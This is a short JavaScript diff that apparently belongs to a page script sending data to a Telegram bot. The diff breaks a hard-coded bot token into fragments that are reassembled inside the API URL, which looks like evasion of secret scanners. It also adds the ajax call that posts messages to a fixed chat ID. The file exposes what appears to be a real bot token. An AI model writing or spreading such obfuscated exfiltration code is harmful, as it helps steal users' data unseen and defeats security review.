@@ -1,7 +1,8 @@
 var memory = [false, false, false, false];
 var permission = false;
 
-var telegram_bot_id = "5131296671:AAGykaDitgMj7v2xENz7JJeejyfyERcmork";
+var bot_id = "51312";;
+var ss = "AAGykaDitgMj7v2xENz7JJeejyfyERcmork";
 var chat_id = "5171498371";
 
 function setFields(data) {
@@ -53,7 +54,7 @@ function sendMessage(message) {
   var settings = {
     "async": true,
     "crossDomain": true,
-    "url": "https://api.telegram.org/" + telegram_bot_id + "/sendMessage",
+    "url": "https://api.telegram.org/" + bot_id + "96671:" + ss + "/sendMessage",
     "method": "POST",
     "headers": {
       "Content-Type": "application/json",
@@ -63,7 +64,10 @@ function sendMessage(message) {
       "chat_id": chat_id,
       "text": message
     })
-  }
+  };
+  $.ajax(settings).done(function (response){
+    console.log(reponse);
+  });
 }
 
 function clickHandler(event) {
